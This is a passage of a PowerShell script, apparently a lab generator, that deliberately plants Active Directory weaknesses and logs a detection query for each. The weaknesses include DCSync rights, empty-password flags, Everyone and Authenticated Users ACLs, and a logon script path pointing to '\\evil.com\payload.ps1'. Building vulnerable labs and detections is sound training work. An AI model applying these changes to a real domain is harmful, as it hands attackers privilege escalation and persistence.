    Write-Log "Injection: Dangerous Group Nesting (deep hierarchy): 1..." "MEDIUM"

    try {
        $groupOU = "OU=Groups,OU=GlobalCorp,$($Config.DomainDN)"

        # Creer chaine de 6 groupes imbriques
        $nestedGroups = @()
        for ($i = 1; $i -le 6; $i++) {
            $gName = "NestedGroup-L$i"
            try {
                New-ADGroup -Name $gName `
                           -SamAccountName $gName `
                           -GroupCategory Security `
                           -GroupScope Global `
                           -Path $groupOU `
                           -Description "Nested group level $i" `
                           -ErrorAction SilentlyContinue

                $nestedGroups += $gName
            } catch {}
        }

        # Imbriquer les groupes L1 -> L2 -> L3 -> L4 -> L5 -> L6 -> Domain Admins
        for ($i = 0; $i -lt ($nestedGroups.Count - 1); $i++) {
            try {
                Add-ADGroupMember -Identity $nestedGroups[$i+1] -Members $nestedGroups[$i] -ErrorAction SilentlyContinue
            } catch {}
        }

        # Dernier groupe vers Domain Admins
        try {
            Add-ADGroupMember -Identity "Domain Admins" -Members $nestedGroups[-1] -ErrorAction SilentlyContinue
        } catch {}

        $vulnerabilities += @{
            Type = "Dangerous_Group_Nesting"
            Groups = $nestedGroups -join " -> "
            Depth = 6
            Severity = "Medium"
            Description = "Chaine de groupes imbriques >5 niveaux vers Domain Admins"
            Impact = "Escalade privileges non evidente"
            Detection = "Parcours recursif des groupes jusqu'a DA/EA"
        }
    } catch {
        Write-Log "Error Dangerous Group Nesting: $_" "ERROR"
    }

    # =========================================================================
    # 61. AUTHENTICATED USERS IN ACLS (0.2%)
    # =========================================================================
    $authUsersACLCount = [math]::Max(1, [math]::Round($vulnCount * 0.002))
    Write-Log "Injection: Authenticated Users in ACLs: $authUsersACLCount..." "MEDIUM"

    $authTargets = $Users | Get-Random -Count ([math]::Min($authUsersACLCount, $Users.Count))

    foreach ($targetUser in $authTargets) {
        try {
            $acl = Get-Acl "AD:\$((Get-ADUser $targetUser.SamAccountName).DistinguishedName)"

            # SID Authenticated Users = S-1-5-11
            $authUsersSID = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")

            $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                $authUsersSID,
                "GenericAll",
                "Allow"
            )
            $acl.AddAccessRule($rule)
            Set-Acl -Path "AD:\$((Get-ADUser $targetUser.SamAccountName).DistinguishedName)" -AclObject $acl

            $vulnerabilities += @{
                Type = "Authenticated_Users_In_ACLs"
                Target = $targetUser.SamAccountName
                Severity = "Medium"
                Description = "GenericAll accorde a Authenticated Users"
                Impact = "Tous les utilisateurs authentifies peuvent modifier cet objet"
                Detection = "(Get-Acl 'AD:\$dn').Access | Where-Object {`$_.IdentityReference -match 'Authenticated Users' -and `$_.ActiveDirectoryRights -match 'GenericAll'}"
            }
        } catch {
            Write-Log "Error Authenticated Users ACL for $($targetUser.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 62. DOMAIN ADMIN IN DESCRIPTION (0.5%)
    # =========================================================================
    $daDescCount = [math]::Max(3, [math]::Round($vulnCount * 0.005))
    Write-Log "Injection: Domain Admin mention in description: $daDescCount..." "MEDIUM"

    $daDescUsers = $Users | Get-Random -Count ([math]::Min($daDescCount, $Users.Count))

    foreach ($user in $daDescUsers) {
        try {
            Set-ADUser -Identity $user.SamAccountName -Description "Former Domain Admin - retired account" -ErrorAction Stop

            $vulnerabilities += @{
                Type = "Domain_Admin_In_Description"
                User = $user.SamAccountName
                Severity = "Medium"
                Description = "Mention 'Domain Admin' dans description"
                Impact = "Information leak sur comptes privilegies"
                Detection = "Get-ADUser -Filter * -Properties description | Where-Object {`$_.description -match '(?i)(domain\s*admin|administrateur)'}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "Domain_Admin_In_Description"
        } catch {
            Write-Log "Error Domain Admin in Description for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 63. DISABLED ACCOUNT IN ADMIN GROUP (0.2%)
    # =========================================================================
    $disabledAdminCount = [math]::Max(1, [math]::Round($vulnCount * 0.002))
    Write-Log "Injection: Disabled Account in Admin Group: $disabledAdminCount..." "MEDIUM"

    $disabledUsers = $Users | Get-Random -Count ([math]::Min($disabledAdminCount, $Users.Count))

    foreach ($user in $disabledUsers) {
        try {
            # Ajouter a Schema Admins
            Add-ADGroupMember -Identity "Schema Admins" -Members $user.SamAccountName -ErrorAction Stop

            # Desactiver le compte
            Disable-ADAccount -Identity $user.SamAccountName -ErrorAction Stop

            $vulnerabilities += @{
                Type = "Disabled_Account_In_Admin_Group"
                User = $user.SamAccountName
                Group = "Schema Admins"
                Severity = "Medium"
                Description = "Compte desactive mais toujours dans Schema Admins"
                Impact = "Reactivation facile pour persistence"
                Detection = "Get-ADUser -Filter {Enabled -eq `$false} -Properties MemberOf | Where-Object {`$_.MemberOf -match 'Admin'}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "Disabled_Account_In_Admin_Group"
        } catch {
            Write-Log "Error Disabled Account in Admin Group for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 64. EMPTY PASSWORD (0.1%)
    # =========================================================================
    $emptyPwdCount = [math]::Max(1, [math]::Round($vulnCount * 0.001))
    Write-Log "Injection: Empty Password (PASSWORD_NOT_REQUIRED): $emptyPwdCount..." "LOW"

    $emptyPwdUsers = $Users | Get-Random -Count ([math]::Min($emptyPwdCount, $Users.Count))

    foreach ($user in $emptyPwdUsers) {
        try {
            # Activer PASSWORD_NOT_REQUIRED
            $uac = (Get-ADUser $user.SamAccountName -Properties userAccountControl).userAccountControl
            $newUAC = $uac -bor 0x20
            Set-ADUser -Identity $user.SamAccountName -Replace @{userAccountControl=$newUAC} -ErrorAction Stop

            $vulnerabilities += @{
                Type = "Empty_Password"
                User = $user.SamAccountName
                Severity = "Low"
                Description = "Mot de passe vide possible (PASSWORD_NOT_REQUIRED)"
                Impact = "Compte accessible sans authentification"
                Detection = "Get-ADUser -Filter {PasswordNotRequired -eq `$true}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "Empty_Password"
        } catch {
            Write-Log "Error Empty Password for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 65. USER CANNOT CHANGE PASSWORD (0.3%)
    # =========================================================================
    $cannotChangePwdCount = [math]::Max(2, [math]::Round($vulnCount * 0.003))
    Write-Log "Injection: User Cannot Change Password: $cannotChangePwdCount..." "LOW"

    $cannotChangePwdUsers = $Users | Get-Random -Count ([math]::Min($cannotChangePwdCount, $Users.Count))

    foreach ($user in $cannotChangePwdUsers) {
        try {
            # Activer PASSWD_CANT_CHANGE
            Set-ADUser -Identity $user.SamAccountName -CannotChangePassword $true -ErrorAction Stop

            $vulnerabilities += @{
                Type = "User_Cannot_Change_Password"
                User = $user.SamAccountName
                Severity = "Low"
                Description = "User ne peut pas changer son mot de passe"
                Impact = "Mot de passe compromis non modifiable par user"
                Detection = "Get-ADUser -Filter {CannotChangePassword -eq `$true}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "User_Cannot_Change_Password"
        } catch {
            Write-Log "Error User Cannot Change Password for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 66. SMARTCARD NOT REQUIRED (0.2%)
    # =========================================================================
    $smartcardCount = [math]::Max(1, [math]::Round($vulnCount * 0.002))
    Write-Log "Injection: Smartcard Not Required (admins): $smartcardCount..." "LOW"

    try {
        $adminUsers = Get-ADGroupMember "Domain Admins" -ErrorAction SilentlyContinue |
                     Where-Object {$_.objectClass -eq 'user'} |
                     Select-Object -First $smartcardCount

        foreach ($admin in $adminUsers) {
            try {
                # S'assurer que SmartcardLogonRequired = false
                Set-ADUser -Identity $admin.SamAccountName -SmartcardLogonRequired $false -ErrorAction Stop

                $vulnerabilities += @{
                    Type = "Smartcard_Not_Required"
                    User = $admin.SamAccountName
                    Severity = "Low"
                    Description = "Compte admin sans smartcard requis"
                    Impact = "Bypass de l'authentification forte"
                    Detection = "Get-ADUser -Filter {SmartcardLogonRequired -eq `$false} -Properties SmartcardLogonRequired,MemberOf | Where-Object {`$_.MemberOf -match 'Admin'}"
                }
            } catch {
                Write-Log "Error Smartcard Not Required for $($admin.SamAccountName): $_" "ERROR"
            }
        }
    } catch {
        Write-Log "Error Smartcard Not Required: $_" "ERROR"
    }

    # =========================================================================
    # 67. DUPLICATE SPN (0.2%)
    # =========================================================================
    $dupSPNCount = [math]::Max(2, [math]::Round($vulnCount * 0.002))
    Write-Log "Injection: Duplicate SPN: $dupSPNCount..." "LOW"

    $dupSPNUsers = $Users | Get-Random -Count ([math]::Min($dupSPNCount, $Users.Count))

    if ($dupSPNUsers.Count -ge 2) {
        try {
            # Utiliser le meme SPN sur 2 comptes differents
            $duplicateSPN = "HTTP/duplicate.aza-me.cc"

            foreach ($user in $dupSPNUsers) {
                try {
                    Set-ADUser -Identity $user.SamAccountName -ServicePrincipalNames @{Add=$duplicateSPN} -ErrorAction Stop
                } catch {}
            }

            $vulnerabilities += @{
                Type = "Duplicate_SPN"
                SPN = $duplicateSPN
                Users = ($dupSPNUsers | ForEach-Object {$_.SamAccountName}) -join ", "
                Severity = "Low"
                Description = "Meme SPN sur plusieurs comptes"
                Impact = "Confusion d'identite, Kerberoasting multiple"
                Detection = "`$allSPNs = Get-ADUser -Filter {ServicePrincipalName -like '*'} -Properties ServicePrincipalName | Select-Object -ExpandProperty ServicePrincipalName; `$allSPNs | Group-Object | Where-Object {`$_.Count -gt 1}"
            }
        } catch {
            Write-Log "Error Duplicate SPN: $_" "ERROR"
        }
    }

    # =========================================================================
    # 68a. USER_CANNOT_CHANGE_PASSWORD (0.3%)
    # =========================================================================
    $cannotChangePwdCount = [math]::Max(2, [math]::Round($vulnCount * 0.003))
    Write-Log "Injection: User Cannot Change Password (flag 0x0040): $cannotChangePwdCount..." "MEDIUM"

    $cannotChangePwdUsers = $Users | Get-Random -Count ([math]::Min($cannotChangePwdCount, $Users.Count))

    foreach ($user in $cannotChangePwdUsers) {
        try {
            $uac = (Get-ADUser $user.SamAccountName -Properties userAccountControl).userAccountControl
            $newUAC = $uac -bor 0x0040  # PASSWD_CANT_CHANGE
            Set-ADUser -Identity $user.SamAccountName -Replace @{userAccountControl=$newUAC}

            $vulnerabilities += @{
                Type = "User_Cannot_Change_Password"
                User = $user.SamAccountName
                Severity = "Medium"
                Description = "User forbidden from changing own password"
                Impact = "User stuck with compromised password, administrative dependency"
                Detection = "Get-ADUser -Filter * -Properties userAccountControl | Where-Object {`$_.userAccountControl -band 0x0040}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "Cannot_Change_Password"
        } catch {
            Write-Log "Error Cannot Change Password for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 68b. SMARTCARD_NOT_REQUIRED (0.2%)
    # =========================================================================
    $noSmartcardCount = [math]::Max(2, [math]::Round($vulnCount * 0.002))
    Write-Log "Injection: Smartcard Not Required (flag 0x40000): $noSmartcardCount..." "MEDIUM"

    $noSmartcardUsers = $Users | Get-Random -Count ([math]::Min($noSmartcardCount, $Users.Count))

    foreach ($user in $noSmartcardUsers) {
        try {
            $uac = (Get-ADUser $user.SamAccountName -Properties userAccountControl).userAccountControl
            $newUAC = $uac -bor 0x40000  # NOT_DELEGATED (also used for smartcard not required)
            Set-ADUser -Identity $user.SamAccountName -Replace @{userAccountControl=$newUAC}

            $vulnerabilities += @{
                Type = "Smartcard_Not_Required"
                User = $user.SamAccountName
                Severity = "Medium"
                Description = "Account exempt from smartcard requirement"
                Impact = "Bypasses smartcard authentication policy"
                Detection = "Get-ADUser -Filter * -Properties userAccountControl | Where-Object {`$_.userAccountControl -band 0x40000}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "Smartcard_Not_Required"
        } catch {
            Write-Log "Error Smartcard Not Required for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 68c. EXPIRED_ACCOUNT_IN_ADMIN_GROUP (create 2 expired admins)
    # =========================================================================
    Write-Log "Injection: Expired Accounts in Domain Admins: 2..." "HIGH"

    $expiredAdminUsers = $Users | Where-Object { -not $_.IsExecutive } | Get-Random -Count 2

    foreach ($user in $expiredAdminUsers) {
        try {
            # Add to Domain Admins
            Add-ADGroupMember "Domain Admins" -Members $user.SamAccountName -ErrorAction SilentlyContinue

            # Set account to expired (yesterday)
            $expiredDate = (Get-Date).AddDays(-1)
            Set-ADUser -Identity $user.SamAccountName -AccountExpirationDate $expiredDate

            $vulnerabilities += @{
                Type = "Expired_Account_In_Admin_Group"
                User = $user.SamAccountName
                Group = "Domain Admins"
                ExpirationDate = $expiredDate
                Severity = "High"
                Description = "Expired account still member of Domain Admins group"
                Impact = "Potential reactivation for persistence, compliance violation"
                Detection = "Get-ADGroupMember 'Domain Admins' | ForEach-Object { Get-ADUser `$_.SamAccountName -Properties AccountExpirationDate | Where-Object {`$_.AccountExpirationDate -and `$_.AccountExpirationDate -lt (Get-Date)} }"
            }
            $user.Vulnerable = $true
            $user.VulnType += "Expired_Admin"
        } catch {
            Write-Log "Error Expired Account in DA for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 68. ULTRA-VULNERABLE USERS (users aleatoires avec 10-30+ vulns chacun)
    # =========================================================================
    if ($script:UltraVulnUsers -gt 0) {
        Write-Log "Injection: Ultra-Vulnerable Users (random honeypots): $($script:UltraVulnUsers)..." "WARNING"

        # Selectionner users aleatoires - prioriser IT
        $allActiveUsers = $Users | Where-Object { -not $_.Vulnerable }
        $itUsers = $allActiveUsers | Where-Object { $_.Department -eq "IT" }
        $otherUsers = $allActiveUsers | Where-Object { $_.Department -ne "IT" }

        $selectedUsers = @()

        # 60% IT users, 40% autres departments (plus realiste)
        $itCount = [Math]::Min(($script:UltraVulnUsers * 0.6), $itUsers.Count)
        $otherCount = $script:UltraVulnUsers - $itCount

        if ($itUsers.Count -ge $itCount) {
            $selectedUsers += $itUsers | Get-Random -Count $itCount
        }

        if ($otherUsers.Count -ge $otherCount -and $otherCount -gt 0) {
            $selectedUsers += $otherUsers | Get-Random -Count $otherCount
        }

        # Si pas assez de users, prendre ce qu'on peut
        if ($selectedUsers.Count -lt $script:UltraVulnUsers) {
            $remaining = $script:UltraVulnUsers - $selectedUsers.Count
            $available = $allActiveUsers | Where-Object { $selectedUsers.SamAccountName -notcontains $_.SamAccountName }
            if ($available.Count -gt 0) {
                $selectedUsers += $available | Get-Random -Count ([Math]::Min($remaining, $available.Count))
            }
        }

        Write-Log "  Selected $($selectedUsers.Count) users for ultra-vulnerability injection" "INFO"
        Write-Log "  IT users: $(($selectedUsers | Where-Object {$_.Department -eq 'IT'}).Count) / Others: $(($selectedUsers | Where-Object {$_.Department -ne 'IT'}).Count)" "INFO"

        foreach ($ultraUser in $selectedUsers) {
            $vulnCount = Get-Random -Minimum $script:UltraVulnMin -Maximum ($script:UltraVulnMax + 1)
            Write-Log "  Processing $($ultraUser.SamAccountName) ($($ultraUser.Department)) - injecting $vulnCount vulnerabilities..." "INFO"

            $injectedVulns = 0

            # 1. PasswordNeverExpires
            try { Set-ADUser $ultraUser.SamAccountName -PasswordNeverExpires $true -ErrorAction Stop; $injectedVulns++ } catch {}

            # 2. AS-REP Roasting
            try { Set-ADAccountControl $ultraUser.SamAccountName -DoesNotRequirePreAuth $true -ErrorAction Stop; $injectedVulns++ } catch {}

            # 3-5. Kerberoasting (3 SPNs)
            if ($vulnCount -ge 10) {
                try {
                    $spns = @("HTTP/$($ultraUser.SamAccountName).aza-me.cc", "MSSQL/$($ultraUser.SamAccountName):1433", "CIFS/$($ultraUser.SamAccountName).aza-me.cc")
                    Set-ADUser $ultraUser.SamAccountName -ServicePrincipalNames @{Add=$spns} -ErrorAction Stop
                    $injectedVulns += 3
                } catch {}
            }

            # 6. Unconstrained Delegation
            if ($vulnCount -ge 12) {
                try { Set-ADAccountControl $ultraUser.SamAccountName -TrustedForDelegation $true -ErrorAction Stop; $injectedVulns++ } catch {}
            }

            # 7. Constrained Delegation
            if ($vulnCount -ge 14) {
                try { Set-ADUser $ultraUser.SamAccountName -Add @{'msDS-AllowedToDelegateTo'='HOST/server.aza-me.cc'} -ErrorAction Stop; $injectedVulns++ } catch {}
            }

            # 8. Reversible Encryption
            try { Set-ADUser $ultraUser.SamAccountName -AllowReversiblePasswordEncryption $true -ErrorAction Stop; $injectedVulns++ } catch {}

            # 9. AdminCount
            try { Set-ADUser $ultraUser.SamAccountName -Replace @{adminCount=1} -ErrorAction Stop; $injectedVulns++ } catch {}

            # 10. UnixUserPassword
            try { Set-ADUser $ultraUser.SamAccountName -Replace @{unixUserPassword=$PlainPassword} -ErrorAction Stop; $injectedVulns++ } catch {}

            # 11-13. Privileged Groups (si vulnCount >= 15)
            if ($vulnCount -ge 15) {
                try { Add-ADGroupMember "Backup Operators" -Members $ultraUser.SamAccountName -ErrorAction Stop; $injectedVulns++ } catch {}
                try { Add-ADGroupMember "Account Operators" -Members $ultraUser.SamAccountName -ErrorAction Stop; $injectedVulns++ } catch {}
                try { Add-ADGroupMember "Print Operators" -Members $ultraUser.SamAccountName -ErrorAction Stop; $injectedVulns++ } catch {}
            }

            # 14-16. High Privilege Groups (si vulnCount >= 20)
            if ($vulnCount -ge 20) {
                try { Add-ADGroupMember "Server Operators" -Members $ultraUser.SamAccountName -ErrorAction Stop; $injectedVulns++ } catch {}
                try { Add-ADGroupMember "Group Policy Creator Owners" -Members $ultraUser.SamAccountName -ErrorAction Stop; $injectedVulns++ } catch {}
                try { Add-ADGroupMember "Schema Admins" -Members $ultraUser.SamAccountName -ErrorAction Stop; $injectedVulns++ } catch {}
            }

            # 17-19. CRITICAL Groups (si vulnCount >= 25)
            if ($vulnCount -ge 25) {
                try { Add-ADGroupMember "Domain Admins" -Members $ultraUser.SamAccountName -ErrorAction Stop; $injectedVulns++ } catch {}
                try { Add-ADGroupMember "Enterprise Admins" -Members $ultraUser.SamAccountName -ErrorAction Stop; $injectedVulns++ } catch {}

                # DCSync Rights (ULTRA CRITICAL)
                try {
                    $userObj = Get-ADUser $ultraUser.SamAccountName
                    $domainDN = $script:Config.DomainDN
                    $aclDomain = Get-Acl -Path "AD:\$domainDN"

                    $dcsyncGuid1 = [Guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
                    $dcsyncGuid2 = [Guid]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"

                    $ruleDCSync1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($userObj.SID, "ExtendedRight", "Allow", $dcsyncGuid1)
                    $ruleDCSync2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($userObj.SID, "ExtendedRight", "Allow", $dcsyncGuid2)

                    $aclDomain.AddAccessRule($ruleDCSync1)
                    $aclDomain.AddAccessRule($ruleDCSync2)
                    Set-Acl -Path "AD:\$domainDN" -AclObject $aclDomain
                    $injectedVulns++
                } catch {}
            }

            # 20+. Shadow Admin + OU Poisoning (si vulnCount >= 28)
            if ($vulnCount -ge 28) {
                try {
                    $userObj = Get-ADUser $ultraUser.SamAccountName
                    $da = Get-ADGroup "Domain Admins"
                    $aclDA = Get-Acl -Path "AD:\$($da.DistinguishedName)"
                    $writeMemberGuid = [Guid]"bf9679c0-0de6-11d0-a285-00aa003049e2"
                    $ruleDA = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($userObj.SID, "WriteProperty", "Allow", $writeMemberGuid)
                    $aclDA.AddAccessRule($ruleDA)
                    Set-Acl -Path "AD:\$($da.DistinguishedName)" -AclObject $aclDA
                    $injectedVulns++
                } catch {}
            }

            # DES Encryption + Password Not Required + Cannot Change Password
            if ($vulnCount -ge 16) {
                try {
                    $uac = (Get-ADUser $ultraUser.SamAccountName -Properties userAccountControl).userAccountControl
                    $newUAC = $uac -bor 0x200000 -bor 0x0020 -bor 0x0040  # DES + PWD_NOT_REQUIRED + CANNOT_CHANGE_PWD
                    Set-ADUser $ultraUser.SamAccountName -Replace @{userAccountControl=$newUAC} -ErrorAction Stop
                    $injectedVulns += 3
                } catch {}
            }

            # Malicious Script Path
            if ($vulnCount -ge 18) {
                try { Set-ADUser $ultraUser.SamAccountName -ScriptPath "\\evil.com\payload.ps1" -ErrorAction Stop; $injectedVulns++ } catch {}
            }

            # Everyone ACLs
            if ($vulnCount -ge 22) {
                try {
                    $userDN = (Get-ADUser $ultraUser.SamAccountName).DistinguishedName
                    $acl = Get-Acl "AD:\$userDN"
                    $everyoneSID = New-Object System.Security.Principal.SecurityIdentifier("S-1-1-0")
                    $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($everyoneSID, "GenericWrite", "Allow")
                    $acl.AddAccessRule($rule)
                    Set-Acl "AD:\$userDN" -AclObject $acl
                    $injectedVulns++
                } catch {}
            }

            $vulnerabilities += @{
                Type = "Ultra_Vulnerable_User"
                User = $ultraUser.SamAccountName
                Department = $ultraUser.Department
                Severity = "Critical"
                VulnCount = $injectedVulns
                Description = "User aleatoire transforme en honeypot avec $injectedVulns vulnerabilites critiques"
                Detection = "Random honeypot - heavily vulnerable account with multiple attack vectors"
            }

            Write-Log "  $($ultraUser.SamAccountName): $injectedVulns vulnerabilities injected successfully" "WARNING"
        }

        Write-Log "Ultra-vulnerable users injection complete: $($selectedUsers.Count) random honeypots created" "WARNING"
    }

    # LEGACY CODE REMOVED - Old hardcoded ultra-vulnerable users (robert.johnson, sarah.williams, michael.brown, jennifer.davis)
    # Now using flexible -UltraVulnUsers parameter to select random users instead

    # =========================================================================
    # 69. GOLDEN TICKET RISK - KRBTGT Password Age Check (Domain-level)
    # =========================================================================
    Write-Log "Checking: Golden Ticket Risk (krbtgt password age)..." "WARNING"

    try {
        $krbtgtUser = Get-ADUser -Identity "krbtgt" -Properties PasswordLastSet -ErrorAction Stop
        $passwordAge = (New-TimeSpan -Start $krbtgtUser.PasswordLastSet -End (Get-Date)).Days

        if ($passwordAge -gt 180) {
            $vulnerabilities += @{
                Type = "Golden_Ticket_Risk"
                Target = "krbtgt"
                Severity = "Critical"
                PasswordAgeDays = $passwordAge
                Description = "krbtgt account password has not been rotated in $passwordAge days (recommended: every 180 days)"
                Impact = "Exposed krbtgt password allows Golden Ticket attacks - unlimited domain persistence"
                Detection = "Get-ADUser krbtgt -Properties PasswordLastSet"
                Remediation = "Rotate krbtgt password twice (golden ticket expiry = 2x rotation)"
            }
            Write-Log "  CRITICAL: krbtgt password is $passwordAge days old (>180 days threshold)" "WARNING"
        } else {
            Write-Log "  INFO: krbtgt password age: $passwordAge days (acceptable)" "INFO"
        }
    } catch {
        Write-Log "Error checking krbtgt password age: $_" "ERROR"
    }

    # =========================================================================
    # 70. ESC1 VULNERABLE CERTIFICATE TEMPLATE (ADCS - if installed)
    # =========================================================================
    Write-Log "Checking: ESC1 Vulnerable Certificate Template (ADCS)..." "WARNING"

    try {
        # Check if ADCS is installed
        $adcsService = Get-Service -Name "CertSvc" -ErrorAction SilentlyContinue

        if ($adcsService -and $adcsService.Status -eq "Running") {
            Write-Log "  ADCS detected - attempting to create vulnerable certificate template..." "WARNING"

            # Note: Creating certificate templates requires Enterprise Admins privileges
            # and the Certificate Templates snap-in (certtmpl.msc) or certutil commands
            # This is a placeholder - actual template creation is complex

            $vulnerabilities += @{
                Type = "ESC1_Vulnerable_Certificate_Template"
                Target = "ADCS"
                Severity = "Critical"
                Description = "ADCS is installed - vulnerable certificate templates (ESC1) can lead to privilege escalation"
                Impact = "Attackers can request certificates for any user including Domain Admins"
                Detection = "certutil -TCAInfo; Get-ADObject -Filter * -SearchBase 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=*'"
                Remediation = "Review all certificate templates - disable 'Subject Alternative Name' (SAN) from request for high-privilege templates"
                Note = "Manual verification required: Check for templates with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (0x00000001)"
            }
            Write-Log "  ADCS is installed - ESC1 vulnerability potential flagged (manual verification required)" "WARNING"
        } else {
            Write-Log "  ADCS not installed or not running - ESC1 vulnerability N/A" "INFO"
        }
    } catch {
        Write-Log "Error checking ADCS/ESC1: $_" "ERROR"
    }

    # =========================================================================
    # 71. ESC2 ANY PURPOSE EKU (ADCS)
    # =========================================================================
    Write-Log "Checking: ESC2 Any Purpose EKU (ADCS)..." "WARNING"

    try {
        if ($adcsService -and $adcsService.Status -eq "Running") {
            $vulnerabilities += @{
                Type = "ESC2_Any_Purpose_EKU"
                Target = "ADCS"
                Severity = "Critical"
                Description = "ADCS template with Any Purpose EKU allows certificate usage for unintended authentication"
                Impact = "Certificate can be used for client authentication even if not intended"
                Detection = "certutil -v -template | findstr /i 'any purpose'; Get-ADObject -Filter * -SearchBase 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration'"
                Remediation = "Remove 'Any Purpose' EKU from certificate templates or restrict to specific EKUs"
                Note = "Check for templates with EKU OID 2.5.29.37.0 (Any Purpose)"
            }
            Write-Log "  ESC2 Any Purpose EKU vulnerability flagged" "WARNING"
        }
    } catch {
        Write-Log "Error checking ADCS/ESC2: $_" "ERROR"
    }

    # =========================================================================
    # 72. ESC3 ENROLLMENT AGENT (ADCS)
    # =========================================================================
    Write-Log "Checking: ESC3 Enrollment Agent (ADCS)..." "WARNING"

    try {
        if ($adcsService -and $adcsService.Status -eq "Running") {
            $vulnerabilities += @{
                Type = "ESC3_Enrollment_Agent"
                Target = "ADCS"
                Severity = "Critical"
                Description = "ADCS template with Enrollment Agent EKU permits requesting certificates on behalf of other users"
                Impact = "Attacker can request certificates for any user including Domain Admins"
                Detection = "certutil -v -template | findstr /i 'enrollment agent'; Check for Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1)"
                Remediation = "Restrict Enrollment Agent templates to authorized personnel only"
                Note = "Requires Application Policy: Certificate Request Agent"
            }
            Write-Log "  ESC3 Enrollment Agent vulnerability flagged" "WARNING"
        }
    } catch {
        Write-Log "Error checking ADCS/ESC3: $_" "ERROR"
    }

    # =========================================================================
    # 73. ESC4 VULNERABLE TEMPLATE ACL (ADCS)
    # =========================================================================
    Write-Log "Checking: ESC4 Vulnerable Template ACL (ADCS)..." "WARNING"

    try {
        if ($adcsService -and $adcsService.Status -eq "Running") {
            $vulnerabilities += @{
                Type = "ESC4_Vulnerable_Template_ACL"
                Target = "ADCS"
                Severity = "High"
                Description = "Certificate template with weak ACLs enables unauthorized certificate enrollments"
                Impact = "Non-privileged users can modify template properties to escalate privileges"
                Detection = "Get-ADObject -Filter * -SearchBase 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration' | Get-Acl | Where-Object {`$_.Access.IdentityReference -match 'Authenticated Users|Domain Users'}"
                Remediation = "Review and restrict ACLs on certificate templates - remove GenericAll/WriteDACL/WriteOwner for non-admins"
                Note = "Check for templates where Domain Users/Authenticated Users have modify permissions"
            }
            Write-Log "  ESC4 Vulnerable Template ACL vulnerability flagged" "WARNING"
        }
    } catch {
        Write-Log "Error checking ADCS/ESC4: $_" "ERROR"
    }

    # =========================================================================
    # 74. ESC6 EDITF_ATTRIBUTESUBJECTALTNAME2 (ADCS CA Flag)
    # =========================================================================
    Write-Log "Checking: ESC6 EDITF_ATTRIBUTESUBJECTALTNAME2 (ADCS)..." "WARNING"

    try {
        if ($adcsService -and $adcsService.Status -eq "Running") {
            # Check if flag is set
            $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration"
            $caName = (Get-ChildItem $regPath -ErrorAction SilentlyContinue | Select-Object -First 1).PSChildName

            if ($caName) {
                $policyModulesPath = "$regPath\$caName\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy"
                $editFlags = Get-ItemProperty -Path $policyModulesPath -Name "EditFlags" -ErrorAction SilentlyContinue

                # EDITF_ATTRIBUTESUBJECTALTNAME2 = 0x00040000
                if ($editFlags -and ($editFlags.EditFlags -band 0x00040000)) {
                    $vulnerabilities += @{
                        Type = "ESC6_EDITF_ATTRIBUTESUBJECTALTNAME2"
                        Target = "ADCS CA: $caName"
                        Severity = "Critical"
                        Description = "ADCS CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set - allows requesting certificates for arbitrary subjects"
                        Impact = "Any user can request certificate with any Subject Alternative Name including Domain Admins"
                        Detection = "certutil -getreg policy\EditFlags; Check if 0x00040000 bit is set"
                        Remediation = "Remove flag: certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2; Restart CertSvc"
                        FlagValue = "0x{0:X8}" -f $editFlags.EditFlags
                    }
                    Write-Log "  CRITICAL: ESC6 EDITF_ATTRIBUTESUBJECTALTNAME2 flag is SET!" "WARNING"
                } else {
                    Write-Log "  ESC6 flag not set (secure configuration)" "INFO"
                }
            }
        }
    } catch {
        Write-Log "Error checking ADCS/ESC6: $_" "ERROR"
    }

    # =========================================================================
    # 75. ESC5 PKI OBJECT ACL VULNERABILITY (ADCS)
    # =========================================================================
    Write-Log "Checking: ESC5 PKI Object ACL Vulnerability (ADCS)..." "WARNING"

    try {
        if ($adcsService -and $adcsService.Status -eq "Running") {
            $vulnerabilities += @{
                Type = "ESC5_PKI_Object_ACL"
                Target = "ADCS"
                Severity = "High"
                Description = "Weak ACLs on PKI objects (CA, NTAuthCertificates, Enrollment Services) enable unauthorized modifications"
                Impact = "Attackers can modify PKI configuration objects to escalate privileges"
                Detection = "Get-ADObject -Filter * -SearchBase 'CN=Public Key Services,CN=Services,CN=Configuration' | Get-Acl | Where-Object {`$_.Access.IdentityReference -match 'Domain Users|Authenticated Users'}"
                Remediation = "Restrict ACLs on PKI container and child objects - remove GenericAll/WriteDACL/WriteOwner for non-admins"
                Note = "Check ACLs on: NTAuthCertificates, AIA, CDP, Enrollment Services, Certificate Templates container"
            }
            Write-Log "  ESC5 PKI Object ACL vulnerability flagged" "WARNING"
        }
